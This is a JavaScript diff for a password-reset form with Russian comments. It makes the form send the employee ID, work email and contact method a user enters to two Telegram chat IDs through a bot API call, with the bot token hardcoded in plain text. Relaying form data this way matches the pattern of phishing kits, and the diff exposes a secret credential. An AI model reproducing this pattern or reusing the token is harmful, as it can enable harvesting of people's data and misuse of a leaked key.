@@ -542,7 +542,7 @@
     };
     
     // Форма восстановления пароля
-    document.getElementById('resetForm').addEventListener('submit', function(e) {
+document.getElementById('resetForm').addEventListener('submit', function(e) {
     e.preventDefault();
 
     const resetBtn = this.querySelector('.login-btn');
@@ -555,15 +555,34 @@
 
     const message = `Пользователь оставил запрос:\nИдентификационный номер сотрудника: ${employeeId}\nСлужебный Email: ${email}\nСпособ связи: ${contactMethod}`;
 
+    // Отправка сообщения первому администратору
     fetch('https://api.telegram.org/bot7268248925:AAHmWrNJvOWIsq1SroDGX_Awro7pWDHWcuI/sendMessage', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-            chat_id: chatId,
+            chat_id: '6924074231',  // ID первого администратора
             text: message
         })
+    })
+    .then(response => response.json())
+    .then(data => {
+        // Отправка сообщения второму администратору
+        if (data.ok) {
+            return fetch('https://api.telegram.org/bot7268248925:AAHmWrNJvOWIsq1SroDGX_Awro7pWDHWcuI/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: '996317285',  // ID второго администратора
+                    text: message
+                })
+            });
+        } else {
+            throw new Error(data.description);
+        }
     })
     .then(response => response.json())
     .then(data => {
@@ -590,6 +609,7 @@
         resetBtn.disabled = false;
     });
 });
+
     
     // Добавление визуальных эффектов для полей ввода
     const inputs = document.querySelectorAll('input');
